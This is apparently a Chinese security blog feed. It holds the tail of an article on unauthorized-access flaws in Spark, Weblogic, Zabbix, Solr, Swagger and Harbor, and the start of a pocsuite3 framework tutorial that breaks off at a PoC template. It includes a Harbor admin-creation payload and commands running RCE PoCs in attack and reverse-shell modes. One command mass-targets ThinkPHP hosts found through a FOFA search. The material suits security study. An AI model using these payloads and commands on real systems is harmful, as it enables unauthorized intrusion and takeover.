Spark未授权访问漏洞"></a>26、Apache Spark未授权访问漏洞</h2><h3 id="（1）漏洞简介-1"><a href="#（1）漏洞简介-1" class="headerlink" title="（1）漏洞简介"></a>（1）漏洞简介</h3><p>Apache Spark是⼀款集群计算系统，其⽀持⽤户向管理节点提交应⽤，并分发给集群执⾏。如果管理节点未启动访问控制，攻击者可以在集群中执⾏任意代码。该漏洞的本质是未授权⽤户可以向Master节点提交⼀个应⽤，Master节点会分发给Slave节点执⾏应⽤。如果应⽤中包含恶意代码，会导致任意代码执⾏，威胁Spark集群整体的安全性。开放：6066、8081、8082 端⼝则很有可能存在漏洞。<br>###（2）复现<br><img src="http://120.48.107.243:9090/blog/2023/04/03/8b4db8ce60bd4808a4c50b889cde8437.png" alt="在这里插入图片描述"><br>###（3）防御手段</p><ol><li>对外关闭敏感端⼝；</li><li>配置⽤户权限认证；</li></ol><h2 id="27、Weblogic未授权访问"><a href="#27、Weblogic未授权访问" class="headerlink" title="27、Weblogic未授权访问"></a>27、Weblogic未授权访问</h2><h3 id="（1）漏洞描述-7"><a href="#（1）漏洞描述-7" class="headerlink" title="（1）漏洞描述"></a>（1）漏洞描述</h3><p>Weblogic是Oracle公司推出的J2EE应⽤服务器，CVE-2020-14882允许未授权的⽤户绕过管理控制台的权限验证访问后台。CVE-2020-14883允许后台任意⽤户通过HTTP协议执⾏任意命令。使⽤这两个漏洞组成的利⽤链，可通过⼀个GET请求在远程Weblogic服务器上以未授权的任意⽤户身份执⾏命令。<br>###（2）复现<br><img src="http://120.48.107.243:9090/blog/2023/04/03/d6dd81acf5434343aa538eb8de4bd0b0.png" alt="在这里插入图片描述"><br>###（3）防御手段<br>下载补丁程序并安装更新。<br>##28、Zabbix未授权访问<br>###（1）漏洞描述<br>zabbix是⼀款服务器监控软件，默认服务开放端⼝为10051，其由server、agent、web等模块组成，其中web模块由PHP编写，⽤来显示数据库中的结果。<br>###（2）复现<br><img src="http://120.48.107.243:9090/blog/2023/04/03/40bb3a79f5e64a34a06ad3f1000bcc24.png" alt="在这里插入图片描述"><br>###（3）防御手段</p><ol><li>设置zabbix的复杂⼝令，不要⽤默认⼝令或弱⼝令，禁⽤guest登录功能；</li><li>zabbix的server和agent都不要以root启动，不要设置AllowRoot&#x3D;1；</li><li>禁⽌agent执⾏run，不要设置EnableRemoteCommands&#x3D;1；</li></ol><h2 id="29、Solr未授权访问"><a href="#29、Solr未授权访问" class="headerlink" title="29、Solr未授权访问"></a>29、Solr未授权访问</h2><h3 id="（1）漏洞描述-8"><a href="#（1）漏洞描述-8" class="headerlink" title="（1）漏洞描述"></a>（1）漏洞描述</h3><p>Solr是⼀个⾼性能，采⽤Java开发，基于Lucene的全⽂搜索服务器。solr的管理界⾯通常包含如下信息：solr的配置信息（包括路径，⽤户名，系统版本信息），数据库的配置信息（地址，⽤户名，密码），数据库搜索数据等。solr未授权访问的危害很⼤，轻则可查询所有数据库信息，重则可读取系统任意⽂件，甚⾄getshell。<br>###（2）复现<br><img src="http://120.48.107.243:9090/blog/2023/04/03/9b804a7daa23426e881a7116584c1110.png" alt="在这里插入图片描述"><br>###（3）防御手段</p><ol><li>配置solr访问控制权限；</li><li>禁⽌将solr暴露在公⽹；</li></ol><h2 id="30、SwaggerUI未授权访问漏洞"><a href="#30、SwaggerUI未授权访问漏洞" class="headerlink" title="30、SwaggerUI未授权访问漏洞"></a>30、SwaggerUI未授权访问漏洞</h2><h3 id="（1）漏洞描述-9"><a href="#（1）漏洞描述-9" class="headerlink" title="（1）漏洞描述"></a>（1）漏洞描述</h3><p>Swagger 是⼀个规范且完整的框架，⽤于⽣成、描述、调⽤和可视化 RESTful ⻛格的 Web 服务。<br>###（2）复现<br><img src="http://120.48.107.243:9090/blog/2023/04/03/956e4f188a86476e942c4cecde9dbbc5.png" alt="在这里插入图片描述"><br>###（3）防御手段<br>设置访问权限。<br>##31、Harbor未授权添加管理员漏洞<br>###（1）漏洞描述<br>Harbor未授权添加任意管理员漏洞。攻击者可通过构造特定的字符串，在未授权的情况下直接创建管理员账号，从⽽接管Harbor镜像仓库。<br>###（2）复现<br>找到注册页面。<br><img src="http://120.48.107.243:9090/blog/2023/04/03/cce95c912e5d42d3b595598cfbb3f24c.png" alt="在这里插入图片描述"><br>点击注册抓包，改包，在最后数据包加上：”has_admin_role”:true<br><img src="http://120.48.107.243:9090/blog/2023/04/03/823d8aa9a9804bc58ba949e584a6b1b3.png" alt="在这里插入图片描述"><br>修改成功，成功添加账号密码，并登录成功。</p><p><img src="http://120.48.107.243:9090/blog/2023/04/03/766b99878cf24b29aba264c1cb225fc6.png" alt="在这里插入图片描述"><br>###（3）防御手段<br>尽快升级到最新版。</p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 漏洞学习 </category>
          
          <category> 未授权访问 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息安全 </tag>
            
            <tag> 漏洞学习 </tag>
            
            <tag> 未授权访问 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>初始PocSuite3框架</title>
      <link href="/2021/11/10/pocsuite3_study/"/>
      <url>/2021/11/10/pocsuite3_study/</url>
      
        <content type="html"><![CDATA[<p><img src="http://120.48.107.243:9090/blog/2023/04/03/349f292ba21e4d78bc45d9142da6d3b0.png" alt="在这里插入图片描述"><br><strong>本篇文章记录的是pocsuite3框架，仅用于学习记录交流，不得用作其他用途。</strong></p><h1 id="一、pocsuite3介绍"><a href="#一、pocsuite3介绍" class="headerlink" title="一、pocsuite3介绍"></a>一、pocsuite3介绍</h1><h2 id="1、pocsuite3是什么？"><a href="#1、pocsuite3是什么？" class="headerlink" title="1、pocsuite3是什么？"></a>1、pocsuite3是什么？</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pocsuite3 是由Knownsec 404 团队开发的开源远程漏洞测试和概念验证开发框架。它配备了强大的概念验证引擎，为终极渗透测试人员和安全研究人员提供了许多不错的功能。并且该工具被kali收录到系统自带工具</span><br></pre></td></tr></table></figure><h2 id="2、为什么要使用它"><a href="#2、为什么要使用它" class="headerlink" title="2、为什么要使用它"></a>2、为什么要使用它</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">按照框架的开发规范编写的poc更加的标准</span><br><span class="line">pocsuite3内部帮助我们解决了并发的问题 , 支持多线程检测 , 就不用自己考虑线程的问题了</span><br><span class="line">pocsuite3集合了常见的网络测绘引擎的api , 更方便我们批量检测 , 可以直接和fofa语句联动</span><br></pre></td></tr></table></figure><p>特点：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">PoC 脚本可以在 verify, attack, shell 模式下以不同的方式运行</span><br><span class="line">插件生态系统</span><br><span class="line">从任何地方（本地文件、redis、数据库、Seebug ...）动态加载 PoC 脚本</span><br><span class="line">从任何地方加载多目标（CIDR、本地文件、redis、数据库、Zoomeye、Shodan fofa ...）</span><br><span class="line">结果可以轻松导出</span><br><span class="line">动态补丁和钩子请求</span><br><span class="line">命令行工具和python包导入都可以使用</span><br><span class="line">IPV6 支持</span><br><span class="line">全球 HTTP/HTTPS/SOCKS 代理支持</span><br><span class="line">用于 PoC 脚本的简单蜘蛛 API</span><br><span class="line">与Seebug集成（用于从 Seebug 网站加载 PoC）</span><br><span class="line">与ZoomEye集成（用于从 ZoomEye 加载目标Dork）</span><br><span class="line">与Shodan集成（用于从 Shodan 加载目标Dork）</span><br><span class="line">与Ceye集成（用于验证盲 DNS 和 HTTP 请求）</span><br><span class="line">与Interactsh集成（用于验证盲 DNS 和 HTTP 请求）</span><br><span class="line">与 Fofa 集成（用于从 Fofa 加载目标Dork）</span><br><span class="line">使用 IDE 的友好调试 PoC 脚本</span><br></pre></td></tr></table></figure><h2 id="3、pocsuite3如何使用？"><a href="#3、pocsuite3如何使用？" class="headerlink" title="3、pocsuite3如何使用？"></a>3、pocsuite3如何使用？</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">下载</span><br><span class="line">安装</span><br><span class="line">常见参数详情</span><br><span class="line">常见使用示例</span><br><span class="line">源码阅读</span><br><span class="line">简单的二开</span><br></pre></td></tr></table></figure><h1 id="二、下载安装和卸载"><a href="#二、下载安装和卸载" class="headerlink" title="二、下载安装和卸载"></a>二、下载安装和卸载</h1><p>项目地址：<a href="https://github.com/knownsec/pocsuite3">https://github.com/knownsec/pocsuite3</a><br>环境：<br>Python 3.7+<br>Works on Linux, Windows, Mac OSX, BSD, etc.<br>pip安装</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pip3 install pocsuite3</span><br><span class="line"></span><br><span class="line"><span class="comment"># use other pypi mirror</span></span><br><span class="line">pip3 install <span class="literal">-i</span> https://pypi.tuna.tsinghua.edu.cn/simple pocsuite3</span><br></pre></td></tr></table></figure><p>安装好的测试：<br><img src="http://120.48.107.243:9090/blog/2023/04/03/54ba7e7334de4d3fbf32fcdbe1cba1c0.png" alt="在这里插入图片描述"><br>卸载<br>如果是pip3安装：pip3 uninstall pocsuite3<br>如果是git clone安装：pip3 uninstall pocsuite3</p><h1 id="三、使用参考"><a href="#三、使用参考" class="headerlink" title="三、使用参考"></a>三、使用参考</h1><p>官方文档：<br><a href="https://github.com/knownsec/pocsuite3/blob/master/docs/USAGE.md">https://github.com/knownsec/pocsuite3/blob/master/docs/USAGE.md</a></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line">D:\pocsuite <span class="literal">-h</span></span><br><span class="line"></span><br><span class="line">,<span class="literal">------</span>.                        ,<span class="literal">--</span>. ,<span class="literal">--</span>.       ,<span class="literal">----</span>.   &#123;<span class="number">1.9</span>.<span class="number">2</span><span class="literal">-nongit-20220415</span>&#125;</span><br><span class="line">|  .<span class="literal">--</span>. <span class="string">&#x27;,---. ,---.,---.,--.,--`--,-&#x27;</span>  <span class="string">&#x27;-.,---.&#x27;</span>.-.  |</span><br><span class="line">|  <span class="string">&#x27;--&#x27;</span> | .-. | .<span class="literal">--</span>(  .-<span class="string">&#x27;|  ||  ,--&#x27;</span>-.  .-| .-. : .<span class="string">&#x27; &lt;</span></span><br><span class="line"><span class="string">|  | --&#x27;</span><span class="string">&#x27; &#x27;</span>-<span class="string">&#x27; \ `--.-&#x27;</span>  `&#x27;  <span class="string">&#x27;&#x27;</span>  |  | |  | \   <span class="literal">--</span>/<span class="string">&#x27;-&#x27;</span>  |</span><br><span class="line">`--<span class="string">&#x27;     `---&#x27;</span> `-<span class="literal">--</span>`-<span class="literal">---</span><span class="string">&#x27; `----&#x27;</span>`--<span class="string">&#x27; `--&#x27;</span>  `-<span class="literal">---</span>`-<span class="literal">---</span><span class="string">&#x27;   https://pocsuite.org</span></span><br><span class="line"><span class="string">usage: pocsuite [options]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">optional arguments:</span></span><br><span class="line"><span class="string">  -h, --help            # 查看帮助信息</span></span><br><span class="line"><span class="string">  --version             # 查看版本</span></span><br><span class="line"><span class="string">  --update             # 更新pocsuite3版本</span></span><br><span class="line"><span class="string">  -v &#123;0,1,2,3,4,5,6&#125;    Verbosity level: 0-6 (default 1)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Target: # 目标</span></span><br><span class="line"><span class="string">  At least one of these options has to be provided to define the target(s)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  -u URL [URL ...], --url URL [URL ...]   # 单个目标 </span></span><br><span class="line"><span class="string">                        Target URL (e.g. &quot;http://www.site.com/vuln.php?id=1&quot;)</span></span><br><span class="line"><span class="string">  -f URL_FILE, --file URL_FILE   # 批量检测目标 , 每一行是一个url, 即一个目标</span></span><br><span class="line"><span class="string">                        Scan multiple targets given in a textual file</span></span><br><span class="line"><span class="string">  -r POC [POC ...]         # 加载poc文件 , 可以是本地或者远程的seebug</span></span><br><span class="line"><span class="string">  -k POC_KEYWORD    Filter PoC by keyword, e.g. ecshop    # 按照poc关键字筛选</span></span><br><span class="line"><span class="string">  -c CONFIGFILE         Load options from a configuration INI file  # 从配置INI文件加载选项</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Mode: # 模式</span></span><br><span class="line"><span class="string">  Pocsuite running mode options</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  --verify              Run poc with verify mode      # poc验证模式</span></span><br><span class="line"><span class="string">  --attack              Run poc with attack mode    # poc攻击模式</span></span><br><span class="line"><span class="string">  --shell               Run poc with shell mode        # poc反弹shell模式</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Request:  # 请求</span></span><br><span class="line"><span class="string">  Network request options  # 网络请求选项 , 检测的本质也是发请求, 可以自定义一些请求头</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  --cookie COOKIE       HTTP Cookie header value  </span></span><br><span class="line"><span class="string">  --host HOST           HTTP Host header value</span></span><br><span class="line"><span class="string">  --referer REFERER     HTTP Referer header value</span></span><br><span class="line"><span class="string">  --user-agent AGENT    HTTP User-Agent header value (default random)</span></span><br><span class="line"><span class="string">  --proxy PROXY         Use a proxy to connect to the target URL</span></span><br><span class="line"><span class="string">  --proxy-cred PROXY_CRED</span></span><br><span class="line"><span class="string">                        Proxy authentication credentials (name:password)   # 代理需要认证</span></span><br><span class="line"><span class="string">  --timeout TIMEOUT     Seconds to wait before timeout connection (default 30)</span></span><br><span class="line"><span class="string">  --retry RETRY         Time out retrials times # 超时, 重试次数</span></span><br><span class="line"><span class="string">  --delay DELAY         Delay between two request of one thread   # 一个线程的两个请求之间的延迟</span></span><br><span class="line"><span class="string">  --headers HEADERS     Extra headers (e.g. &quot;key1: value1\nkey2: value2&quot;)  # 请求头</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Account: # 账号</span></span><br><span class="line"><span class="string">  Telnet404, Shodan, CEye, Fofa account options</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  --login-user LOGIN_USER   # 404账号</span></span><br><span class="line"><span class="string">                        Telnet404 login user</span></span><br><span class="line"><span class="string">  --login-pass LOGIN_PASS  # 404密码</span></span><br><span class="line"><span class="string">                        Telnet404 login password</span></span><br><span class="line"><span class="string">  --shodan-token SHODAN_TOKEN  # 撒旦账号的token</span></span><br><span class="line"><span class="string">                        Shodan token</span></span><br><span class="line"><span class="string">  --fofa-user FOFA_USER     # fofa账号</span></span><br><span class="line"><span class="string">                        fofa user</span></span><br><span class="line"><span class="string">  --fofa-token FOFA_TOKEN  # fofa 账号的token</span></span><br><span class="line"><span class="string">                        fofa token</span></span><br><span class="line"><span class="string">  --quake-token QUAKE_TOKEN # quake账号的token</span></span><br><span class="line"><span class="string">                        quake token</span></span><br><span class="line"><span class="string">  --censys-uid CENSYS_UID # censys 账号的uid</span></span><br><span class="line"><span class="string">                        Censys uid</span></span><br><span class="line"><span class="string">  --censys-secret CENSYS_SECRET  # censys 账号的secret</span></span><br><span class="line"><span class="string">                        Censys secret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Modules: # 模块 , 可以直接结合网络空间测绘引擎的语句直接批量检测</span></span><br><span class="line"><span class="string">  Modules(Seebug, Zoomeye, CEye, Fofa, Quake, Listener) options</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  --dork DORK           Zoomeye dork used for search   # 默认钟馗之眼的语句</span></span><br><span class="line"><span class="string">  --dork-zoomeye DORK_ZOOMEYE</span></span><br><span class="line"><span class="string">                        Zoomeye dork used for search</span></span><br><span class="line"><span class="string">  --dork-shodan DORK_SHODAN</span></span><br><span class="line"><span class="string">                        Shodan dork used for search</span></span><br><span class="line"><span class="string">  --dork-censys DORK_CENSYS</span></span><br><span class="line"><span class="string">                        Censys dork used for search</span></span><br><span class="line"><span class="string">  --dork-fofa DORK_FOFA</span></span><br><span class="line"><span class="string">                        Fofa dork used for search</span></span><br><span class="line"><span class="string">  --dork-quake DORK_QUAKE</span></span><br><span class="line"><span class="string">                        Quake dork used for search</span></span><br><span class="line"><span class="string">  --max-page MAX_PAGE   Max page used in search API  # 最大的页数 , 不好使</span></span><br><span class="line"><span class="string">  --search-type SEARCH_TYPE</span></span><br><span class="line"><span class="string">                        search type used in ZoomEye API, web or host   # 搜索类型</span></span><br><span class="line"><span class="string">  --vul-keyword VUL_KEYWORD</span></span><br><span class="line"><span class="string">                        Seebug keyword used for search      # 使用Seebug漏洞关键字搜索</span></span><br><span class="line"><span class="string">  --ssv-id SSVID        Seebug SSVID number for target PoC  # 使用 ssv-id搜索对应的poc</span></span><br><span class="line"><span class="string">  --lhost CONNECT_BACK_HOST</span></span><br><span class="line"><span class="string">                        Connect back host for target PoC in shell mode  # shell模式下的反弹ip</span></span><br><span class="line"><span class="string">  --lport CONNECT_BACK_PORT</span></span><br><span class="line"><span class="string">                        Connect back port for target PoC in shell mode    # shell模式下的反弹port</span></span><br><span class="line"><span class="string">  --tls                 Enable TLS listener in shell mode</span></span><br><span class="line"><span class="string">  --comparison          Compare popular web search engines   # 使用比较流行的搜索引擎搜索</span></span><br><span class="line"><span class="string">  --dork-b64            Whether dork is in base64 format         # 语句的base64格式</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Optimization: # 选项</span></span><br><span class="line"><span class="string">  Optimization options</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  --plugins PLUGINS     Load plugins to execute   # 加载插件执行</span></span><br><span class="line"><span class="string">  --pocs-path POCS_PATH  </span></span><br><span class="line"><span class="string">                        User defined poc scripts path    # 用户定义的poc脚本路径</span></span><br><span class="line"><span class="string">  --threads THREADS     Max number of concurrent network requests (default 1)  # 线程数</span></span><br><span class="line"><span class="string">  --batch BATCH         Automatically choose defaut choice without asking    # 自动选择默认的询问</span></span><br><span class="line"><span class="string">  --requires            Check install_requires    # 检查安装要求</span></span><br><span class="line"><span class="string">  --quiet               Activate quiet mode, working without logger   # 安静模式, 终端不输出日志</span></span><br><span class="line"><span class="string">  --ppt                 Hiden sensitive information when published to the network # 在发布到网络时隐藏敏感信                                               息</span></span><br><span class="line"><span class="string">  --pcap                use scapy capture flow  # 使用scapy捕获流</span></span><br><span class="line"><span class="string">  --rule                export suricata rules, default export reqeust and response  # 导出suricata规则、默认导出请求和响应</span></span><br><span class="line"><span class="string">  --rule-req            only export request rule  # 只导出请求规则</span></span><br><span class="line"><span class="string">  --rule-filename RULE_FILENAME   </span></span><br><span class="line"><span class="string">                        Specify the name of the export rule file   # 指定导出规则的文件名</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Poc options:  # poc 选项</span></span><br><span class="line"><span class="string">  definition options for PoC</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  --options             Show all definition options   # 显示默认选项值</span></span><br></pre></td></tr></table></figure><h2 id="1、单个url"><a href="#1、单个url" class="headerlink" title="1、单个url"></a>1、单个url</h2><p>单个url使用验证模式运行poc，poc将仅用于漏洞扫描</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pocsuite <span class="literal">-r</span> pocs/poc_example.py <span class="literal">-u</span> http://www.example.com/ <span class="literal">--verify</span></span><br><span class="line">                       poc文件的路径                  待检测的url</span><br><span class="line">                       </span><br><span class="line">pocsuite <span class="literal">-r</span> pocs/thinkphp_rce_myself.py  <span class="literal">-u</span> http://<span class="number">192.168</span>.<span class="number">1.159</span>:<span class="number">8080</span> <span class="literal">--verify</span></span><br></pre></td></tr></table></figure><h2 id="2、批量检测"><a href="#2、批量检测" class="headerlink" title="2、批量检测"></a>2、批量检测</h2><p>扫描文本文件中给定的多个目标</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pocsuite <span class="literal">-r</span> pocs/poc_example.py <span class="operator">-f</span> url.txt <span class="literal">--verify</span></span><br></pre></td></tr></table></figure><h2 id="3、使用Seebug-SSVID"><a href="#3、使用Seebug-SSVID" class="headerlink" title="3、使用Seebug SSVID"></a>3、使用Seebug SSVID</h2><p>POCFILE 可以是文件或 Seebug SSVID。pocsuite 插件可以从任何地方加载 poc 代码</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pocsuite <span class="literal">-r</span> ssvid<span class="literal">-97343</span> <span class="literal">-u</span> http://www.example.com <span class="literal">--shell</span></span><br></pre></td></tr></table></figure><h2 id="4、验证模式"><a href="#4、验证模式" class="headerlink" title="4、验证模式"></a>4、验证模式</h2><p><strong>–verify</strong> 使用验证模式运行 poc。PoC(s) 将仅用于漏洞扫描</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pocsuite <span class="literal">-r</span> pocs/poc_example.py <span class="literal">-u</span> http://www.example.com/ <span class="literal">--verify</span></span><br></pre></td></tr></table></figure><h2 id="5、攻击模式"><a href="#5、攻击模式" class="headerlink" title="5、攻击模式"></a>5、攻击模式</h2><p><strong>–attack</strong> 以攻击模式运行 poc，PoC(s) 将被利用，它可能允许黑客&#x2F;研究人员闯入实验室</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pocsuite <span class="literal">-r</span> pocs/poc_example.py <span class="literal">-u</span> http://www.example.com/ <span class="literal">--attack</span></span><br><span class="line">pocsuite <span class="literal">-r</span> pocs/thinkphp_rce2.py  <span class="literal">-u</span> http://<span class="number">192.168</span>.<span class="number">6.29</span>:<span class="number">8080</span>/ <span class="literal">--attack</span></span><br></pre></td></tr></table></figure><h2 id="6、shell模式"><a href="#6、shell模式" class="headerlink" title="6、shell模式"></a>6、shell模式</h2><p><strong>–shell</strong> 以 shell 模式运行 poc，PoC 将可被利用，当 PoC shellcode 成功执行时，pocsuite3 将进入交互式 shell</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pocsuite <span class="literal">-r</span> pocs/poc_example.py <span class="literal">-u</span> http://www.example.com <span class="literal">--shell</span></span><br></pre></td></tr></table></figure><h2 id="7、线程数"><a href="#7、线程数" class="headerlink" title="7、线程数"></a>7、线程数</h2><p>使用多线程，默认线程数为1<br>pocsuite -r pocs&#x2F;poc_example.py -f url.txt –verify –threads 10<br>##8、fofa语句<br>如果是fofa用户，可以使用fofa语句进行批量查询</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pocsuite <span class="literal">-r</span> pocs/thinkphp_rce2.py <span class="literal">--dork-fofa</span> <span class="string">&#x27;body=\&quot;thinkphp\&quot;&#x27;</span> <span class="literal">--search-type</span> web <span class="literal">--thread</span> <span class="number">20</span></span><br></pre></td></tr></table></figure><h1 id="四、POC编写"><a href="#四、POC编写" class="headerlink" title="四、POC编写"></a>四、POC编写</h1><p>官方文档：<br><a href="https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md">https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md</a><br>模版路径：<br>D:\software\python3\Lib\site-packages\pocsuite3\pocs\demo_poc.py<br>模版分析：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">```python</span><br><span class="line">from collections import OrderedDict</span><br><span class="line">from pocsuite3.api import (</span><br><span class="line">    Output,</span><br><span class="line">    POCBase,</span><br><span class="line">    POC_CATEGORY,</span><br><span class="line">    register_poc,</span><br><span class="line">    requests,</span><br><span class="line">    